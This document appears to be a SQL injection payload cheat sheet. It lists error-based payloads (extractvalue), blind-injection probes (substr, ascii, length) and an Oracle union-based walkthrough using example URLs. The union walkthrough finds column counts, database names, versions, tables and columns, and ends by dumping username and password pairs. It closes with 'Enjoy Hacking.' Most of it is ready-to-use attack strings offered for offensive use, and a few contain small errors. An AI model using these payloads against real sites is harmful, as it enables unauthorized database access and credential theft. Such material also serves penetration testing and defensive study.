PAYLOAD
====

<H3>Errror base payload:</h3>
  
     
  If data is passsing INSERT querry and error is triggering

    ' or extractvalue(1,concat(0x7e,user())) or ' to find user()
  
    ' or extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) or ' to find table name

If data is passing in select querry

    and extractvalue(1,concat(0x7e,user())) to find user()

    and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) to find table name

<h3>Blind SQL Injection</h3>
  
  Substring() To find the user() name
  
       substr(user(),1,1)>'a'   position* character*
  
  Ascii() To find the character from the value
  
       ascii(substr(user(),1,1))>10

Length() To find the length of the string
  
  length(database())>10
  
  Inserting Inline querry
  
       ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1,1)>100 to find table name
  
  <h3>Union SQL Injection in Oracle db</h3>
  
  To find number of columns:
  
          www.vuln-web.com/photo.php?id=1' order by 1--
          

Unlike MySQL Oracle do not allow select statement without from clause. As we have prepared the Union select statement our next task is to check which column is getting printed that we can do by random testing each column one by one by printing the current database name

        www.vuln-web.com/photo.php?id=1' union select null,null,null,null,null,null,null,null,null from             dual--

    www.vuln-web.com/photo.php?id=1' union select null,'2222',null,null,null,null,null,null,null from dual--
    2222 gets Printed


 This means we can use the second column from now. Now to get the Database name we can use:
(select ora_database_name from dual)
(select sys.database_name from dual)
(select global_name from global_name)


            www.b0x.com/photo.php?id=1' union select                                                                   null,ora.database_name,null,null,null,null,null,null,null from                                             dual--


To get the username we can use:
(select user from DUAL)
(select user from users)


          www.b0x.com/photo.php?id=1' union select null,user,null,null,null,null,null,null,null from dual--


To get the version we can use:
(select banner from v$version where rownum=1)


            www.b0x.com/photo.php?id=1' union select null,(select banner from v$version where                           rownum=1),null,null,null,null,null,null,null from dual-- 


To get the Table Names we can use:
(select table_name from all_tables)


        www.b0x/photo.php?id=1' union select null,table_name,null,null,null,null,null,null,null from               all_tables--


To get the columns for a specific table we can use (here in example i am using user_table):
(select column_name from all_tab_columns where table_name='Your_Table_name_here')


            www.b0x/photo.php?id=1' union select null,column_name,null,null,null,null,null,null,null from               all_tab_columns where table_name='user_table'--


To extract data from some columns we can use the following query alongwith the || as concatination operator:
(select username||password from table_name_here)


        www.b0x.com/photo.php?id=1' union select null,username||password,null,null,null,null,null,null,null         from user_table--



Enjoy Hacking.  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
